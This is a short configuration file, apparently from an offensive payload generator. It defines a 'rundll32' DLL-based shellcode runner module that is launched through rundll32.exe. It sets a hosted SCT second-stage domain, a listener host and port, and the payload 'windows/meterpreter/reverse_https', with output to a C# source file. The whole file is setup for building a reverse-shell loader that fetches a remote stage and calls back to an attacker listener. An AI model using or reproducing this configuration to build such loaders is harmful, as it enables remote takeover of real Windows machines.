[Type]
name: rundll32
info: DLL based shellcode runner
template: ./template/SCT/allthethings.template
runInfo: rundll32.exe AllTheThings_rundll32.exe.dll,EntryPoint

[HostedDomain]
var: http://127.0.0.1
allowWilds: True
help: The domain, IP, or path of your Hosted SCT second stage

[ListenerDomain]
var: 127.0.0.1
allowWilds: True
help: Your listener domain or IP, can be a redirector

[ListenerPort]
var: 443
allowWilds: True
forceInteger: True
help: Your listener port

[Payload]
var: windows/meterpreter/reverse_https
help: The type of payload

[Output]
var: allthethings_rundll32.cs
allowWilds: True
